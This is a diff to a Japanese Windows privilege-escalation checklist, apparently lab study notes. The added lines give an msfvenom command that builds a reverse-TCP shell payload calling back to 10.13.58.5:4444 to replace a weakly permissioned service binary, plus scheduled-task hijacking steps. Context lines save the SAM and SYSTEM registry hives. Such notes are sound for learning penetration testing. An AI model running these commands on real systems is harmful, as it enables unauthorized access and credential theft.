@@ -31,8 +31,17 @@ version
 6. (Get-PSReadlineOption).HistorySavePathコマンドで、PSReadlineモジュールが記録したPowerShellのコマンド履歴に認証情報が置いてないか
 7. Public\配下にtranscriptファイルが置かれていないか
 8. GUIアクセスできる場合、イベントビューア > Application and Service Log > Microsoft > Windows > PowerShell > Operationalにスクリプトログが残されていないか、そこに認証情報が無いか
-9. Windowsサービスに紐づいたバイナリファイルに、全ユーザに対してのフルアクセス権限が割り当てられており、バイナリファイル、もしくはDLLを書き換えられないか
-10. ダブルクオーテーションで囲まれていないサービスにリンクされたバイナリのファイルが存在し、そのバイナリが存在するパスへの書き込み権限はないか
+9. Windowsサービスに紐づいたバイナリファイルに、全ユーザに対してのフルアクセス権限が割り当てられており、バイナリファイル、もしくはDLLを書き換えられないか。
+```
+sc qc apphostsvc # apphostsvcのサービスにクエリを送ってサービス状態を確認する。
+icacls <apphostsvcバイナリのファイルパス> #これで変更権限があればシェルをとれるかも。
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=10.13.58.5 LPORT=4444 -f exe-service -o rev-svc.exe # Kali側で、権限が弱いサービスに紐づいたバイナリを置き換えるためのペイロードを生成する。
+```
+10. ダブルクオーテーションで囲まれていないサービスにリンクされたバイナリのファイルが存在し、そのバイナリが存在するパスへの書き込み権限はないか。
+```
+
+```
+
 11. SeImpersonatePrivilegeの権限が有効になっていないか
 12. 自分がアクセスできるユーザが、SIDをコンバートしたときに、ドメイン内でGenericAllのような強力なユーザを持っていないか
 13. ドメイン共有内の古いポリシーファイルの.xmlファイルに、GPP(Group Policy Preference)のパスワードがないか
@@ -77,7 +86,14 @@ whoami /priv
 reg save hklm\system C:\Users\THMBackup\system.hive
 reg save hklm\sam C:\Users\THMBackup\sam.hive
 ```
-
+22. 実行されるタスクに含まれるパラメータ(Run as User)と、そのタスクを実行するユーザが誰か。(Task to Run)  
+別ユーザによって実行されていて、かつicaclsでバイナリをチェックしたときに書き込み可能なら、バイナリを置き換えて権限昇格ができるかも。
+```
+schtasks /query /tn vulntask /fo list /v
+icacls C:\tasks\schtask.bat
+C:\> schtasks /run /tn vulntask
+# スケジュールタスクの確認 => タスクへの権限チェック => タスクの手動実行
+```
 
 ===========
 
